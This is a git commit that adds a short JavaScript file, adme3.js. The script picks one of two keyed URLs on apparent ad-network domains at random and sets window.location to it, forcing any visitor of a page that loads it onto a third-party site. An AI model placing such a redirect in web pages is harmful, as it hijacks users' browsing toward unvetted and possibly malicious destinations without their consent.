d0a433a3560e7cc8f2c5a9994f7942276a58cfa3
un13z <97453482+un13z@users.noreply.github.com>
2022-01-21 21:44:22 +0800

    Create adme3.js

---
+++ adme3.js
@@ -0,0 +1,6 @@
+var dataUrl = [
+'https://plumbingcurlproximity.com/wxcenvshdx?key=7c6ca30775fee8458ee180571fa36a1d',
+'https://backmerriment.com/xcj8mqd5y3?key=ab3490eb6b1631ba541762988045c098'
+];
+var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
+window.location = randomItem;
